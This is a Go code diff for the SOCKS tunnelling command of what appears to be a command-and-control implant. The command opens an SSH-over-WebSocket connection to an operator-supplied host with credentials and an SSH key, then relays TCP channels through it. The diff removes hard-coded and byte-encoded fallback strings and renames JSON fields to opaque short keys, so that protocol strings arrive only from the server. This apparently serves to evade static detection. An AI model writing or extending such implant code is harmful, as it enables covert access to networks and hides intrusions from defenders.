@@ -31,13 +31,6 @@ const (
 	idxSocksErrLimitReached   = 146
 )
 
-// Minimal fallback byte arrays (only used if template missing)
-var (
-	fallbackStart     = string([]byte{0x73, 0x74, 0x61, 0x72, 0x74})                                                                                           // start
-	fallbackStop      = string([]byte{0x73, 0x74, 0x6f, 0x70})                                                                                                 // stop
-	fallbackDirectTcp = string([]byte{0x64, 0x69, 0x72, 0x65, 0x63, 0x74, 0x2d, 0x74, 0x63, 0x70, 0x69, 0x70})                                                 // direct-tcpip
-	fallbackKeepalive = string([]byte{0x6b, 0x65, 0x65, 0x70, 0x61, 0x6c, 0x69, 0x76, 0x65, 0x40, 0x67, 0x6f, 0x6c, 0x61, 0x6e, 0x67, 0x2e, 0x6f, 0x72, 0x67}) // keepalive@golang.org
-)
 
 type SocksCommand struct {
 	wsConn          *websocket.Conn
@@ -90,16 +83,16 @@ func (c *SocksCommand) Execute(ctx *CommandContext, args []string) CommandResult
 
 	// Parse socks config with merged template
 	var socksData struct {
-		Action      string   `json:"action"`
-		SocksPort   int      `json:"socks_port"`
-		WSSPort     int      `json:"wss_port"`
-		WSSHost     string   `json:"wss_host"`
+		Action      string   `json:"at"`
+		SocksPort   int      `json:"sp"`
+		WSSPort     int      `json:"wp"`
+		WSSHost     string   `json:"wh"`
 		Path        string   `json:"path"`
 		Credentials struct {
-			Username string `json:"username"`
-			Password string `json:"password"`
-			SSHKey   string `json:"ssh_key"`
-		} `json:"credentials"`
+			Username string `json:"un"`
+			Password string `json:"pw"`
+			SSHKey   string `json:"sk"`
+		} `json:"cr"`
 		// Template fields (merged by server)
 		Templates []string `json:"tpl"`
 		Version   int      `json:"v"`
@@ -120,13 +113,7 @@ func (c *SocksCommand) Execute(ctx *CommandContext, args []string) CommandResult
 
 	// Get action strings from template
 	actionStart := c.getTpl(idxSocksActionStart)
-	if actionStart == "" {
-		actionStart = fallbackStart
-	}
 	actionStop := c.getTpl(idxSocksActionStop)
-	if actionStop == "" {
-		actionStop = fallbackStop
-	}
 
 	switch socksData.Action {
 	case actionStart:
@@ -141,9 +128,6 @@ func (c *SocksCommand) Execute(ctx *CommandContext, args []string) CommandResult
 
 		// Build WebSocket URL using template format
 		wssFmt := c.getTpl(idxSocksWssFmt)
-		if wssFmt == "" {
-			wssFmt = "wss://%s:%d%s"
-		}
 		wsURL := fmt.Sprintf(wssFmt,
 			socksData.WSSHost,
 			socksData.WSSPort,
@@ -258,9 +242,6 @@ func (c *SocksCommand) Execute(ctx *CommandContext, args []string) CommandResult
 
 func (c *SocksCommand) keepAlive(sshConn ssh.Conn) {
 	keepaliveStr := c.getTpl(idxSocksKeepalive)
-	if keepaliveStr == "" {
-		keepaliveStr = fallbackKeepalive
-	}
 
 	for {
 		c.mu.RLock()
@@ -365,19 +346,8 @@ func (c *SocksCommand) handleChannels(chans <-chan ssh.NewChannel) {
 
 func (c *SocksCommand) handleChannelOpen(newChannel ssh.NewChannel) {
 	directTcpStr := c.getTpl(idxSocksDirectTcpip)
-	if directTcpStr == "" {
-		directTcpStr = fallbackDirectTcp
-	}
-
 	unknownChanStr := c.getTpl(idxSocksErrUnknownChannel)
-	if unknownChanStr == "" {
-		unknownChanStr = "unknown channel type"
-	}
-
 	connLimitStr := c.getTpl(idxSocksErrLimitReached)
-	if connLimitStr == "" {
-		connLimitStr = "connection limit reached"
-	}
 
 	if newChannel.ChannelType() != directTcpStr {
 		newChannel.Reject(ssh.UnknownChannelType, unknownChanStr)
